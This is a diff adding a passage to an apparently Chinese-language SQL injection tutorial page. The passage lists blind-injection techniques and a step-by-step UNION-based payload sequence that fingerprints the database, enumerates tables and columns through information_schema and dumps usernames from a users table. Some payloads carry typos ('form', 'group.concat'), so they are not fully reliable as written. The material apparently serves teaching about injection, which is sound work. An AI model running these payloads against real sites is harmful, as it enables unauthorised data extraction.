@@ -248,7 +248,26 @@ password<span class="pl-k">=</span>anypassword</pre></div>
 <li>利用时间盲注（Time-Based Blind Injection），通过延时操作来判断注入是否成功。例如：<code class="notranslate">' OR SLEEP(5) --</code>，如果延时成功，说明注入成功。</li>
 <li>利用错误盲注（Error-Based Blind Injection），通过构造导致错误的SQL语句，分析错误信息的反馈来获取信息。</li>
 <li>编码/加密请求，避开输入验证和防火墙的检测。</li>
-</ul></div>
+</ul>
+<div class="highlight highlight-source-sql"><pre class="notranslate">?id<span class="pl-k">=</span><span class="pl-c1">1</span><span class="pl-s"><span class="pl-pds">'</span> --+</span>
+<span class="pl-s">select * form users where id=1<span class="pl-pds">'</span></span> <span class="pl-c"><span class="pl-c">--</span>   #URL中的+号被转义成空格</span>
+
+id<span class="pl-k">=</span><span class="pl-c1">1</span><span class="pl-s"><span class="pl-pds">'</span> and 1=1 --+  #判断SQL是否可以注入</span>
+<span class="pl-s"></span>
+<span class="pl-s">id=1<span class="pl-pds">'</span></span> <span class="pl-k">order by</span> <span class="pl-c1">10</span><span class="pl-c"><span class="pl-c">--</span>+  #以第10列排序 根据此命令判定列数</span>
+
+id<span class="pl-k">=</span><span class="pl-c1">1</span><span class="pl-s"><span class="pl-pds">'</span> union select 1,2,3--+ </span>
+<span class="pl-s">id=-1<span class="pl-pds">'</span></span> <span class="pl-k">union</span> <span class="pl-k">select</span> <span class="pl-c1">1</span>,<span class="pl-c1">2</span>,<span class="pl-c1">3</span><span class="pl-c"><span class="pl-c">--</span>+  #回显位</span>
+
+id<span class="pl-k">=</span><span class="pl-k">-</span><span class="pl-c1">1</span><span class="pl-s"><span class="pl-pds">'</span> union select 1,database(),3--+  #获取数据库名</span>
+<span class="pl-s"></span>
+<span class="pl-s">id=-1<span class="pl-pds">'</span></span> <span class="pl-k">union</span> <span class="pl-k">select</span> <span class="pl-c1">1</span>,(<span class="pl-k">select</span> table_name <span class="pl-k">from</span> <span class="pl-c1">information_schema</span>.<span class="pl-c1">tables</span> <span class="pl-k">where</span> table_schema<span class="pl-k">=</span><span class="pl-s"><span class="pl-pds">'</span>security<span class="pl-pds">'</span></span>),<span class="pl-c1">3</span><span class="pl-c"><span class="pl-c">--</span>+  #由于网站限制，只能显示一行，但是返回结果是多行</span>
+
+id<span class="pl-k">=</span><span class="pl-k">-</span><span class="pl-c1">1</span><span class="pl-s"><span class="pl-pds">'</span> union select 1,(select group.concat(table_name) from information_schema.tables where table_schema=<span class="pl-pds">'</span></span>security<span class="pl-s"><span class="pl-pds">'</span>),3--+  #正确显示出所有表名</span>
+<span class="pl-s"></span>
+<span class="pl-s">id=-1<span class="pl-pds">'</span></span> <span class="pl-k">union</span> <span class="pl-k">select</span> <span class="pl-c1">1</span>,(<span class="pl-k">select</span> <span class="pl-c1">group</span>.<span class="pl-c1">concat</span>(column_name) <span class="pl-k">from</span> <span class="pl-c1">information_schema</span>.<span class="pl-c1">columns</span> <span class="pl-k">where</span> table_schema<span class="pl-k">=</span><span class="pl-s"><span class="pl-pds">'</span>security<span class="pl-pds">'</span></span> <span class="pl-k">and</span> table_name<span class="pl-k">=</span><span class="pl-s"><span class="pl-pds">'</span>users<span class="pl-pds">'</span></span>),<span class="pl-c1">3</span><span class="pl-c"><span class="pl-c">--</span>+   #查找users表中各列（字段）的名称</span>
+
+id<span class="pl-k">=</span><span class="pl-k">-</span><span class="pl-c1">1</span><span class="pl-s"><span class="pl-pds">'</span> union select 1,(select group.concat(username) from users),3--+  #查询users表中username这一列的所有值</span></pre></div></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
